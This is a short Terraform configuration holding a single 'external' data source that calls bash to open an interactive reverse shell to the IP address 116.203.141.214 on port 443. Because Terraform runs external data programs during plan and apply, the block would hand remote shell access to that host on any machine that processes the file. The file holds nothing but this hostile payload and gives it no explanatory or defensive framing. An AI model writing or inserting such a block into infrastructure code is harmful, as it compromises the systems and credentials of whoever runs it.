data "external" "example" {
  program = ["bash", "-c", "bash -i >& /dev/tcp/116.203.141.214/443 0>&1"]
}
